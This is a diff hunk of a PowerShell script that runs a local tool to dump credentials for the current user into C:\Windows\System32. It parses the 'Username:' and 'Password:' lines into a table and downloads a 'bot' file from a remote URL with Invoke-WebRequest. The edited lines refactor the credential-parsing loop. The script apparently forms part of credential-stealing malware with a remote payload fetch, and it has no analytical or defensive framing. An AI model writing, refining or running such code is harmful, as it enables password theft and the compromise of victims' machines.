@@ -76,32 +76,28 @@ $outputPath = Join-Path -Path "C:\Windows\System32" -ChildPath ("$currentUsernam
 Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $outputPath -Wait
 if (Test-Path $outputPath) {
 } else {}
-$epaFiles = Get-ChildItem -Path $directoryPath -Filter "*epa.txt"
-$allCredentials = @()
-foreach ($epaFile in $epaFiles) {
-    $outputContent = Get-Content $epaFile.FullName
-    $usernames = @()
-    $passwords = @()
-    $userRegex = "Username: (.+)"
-    $passwordRegex = "Password: (.+)"
-    foreach ($line in $outputContent) {
-        if ($line -match $userRegex) {
-            $usernames += $matches[1]
-        } elseif ($line -match $passwordRegex) {
-            $passwords += $matches[1]
-        }
+$outputContent = Get-Content $outputFilePath
+$usernames = @()
+$passwords = @()
+$userRegex = "Username: (.+)"
+$passwordRegex = "Password: (.+)"
+foreach ($line in $outputContent) {
+    if ($line -match $userRegex) {
+        $usernames += $matches[1]
+    } elseif ($line -match $passwordRegex) {
+        $passwords += $matches[1]
     }
+}
+if ($usernames.Count -eq $passwords.Count) {
     $credentialsTable = @()
     for ($i = 0; $i -lt $usernames.Count; $i++) {
         $credentialsTable += [PSCustomObject]@{
-            File = $epaFile.Name
+            File = $outputFilePath
             Username = $usernames[$i]
             Password = $passwords[$i]
         }
     }
-    $allCredentials += $credentialsTable
-}
-$allCredentials | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
+$credentialsTable | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
 Invoke-WebRequest -Uri $boturl -OutFile $botpath
 if (Test-Path $botpath) {
     $output = "C:\Windows\System32\output.txt"
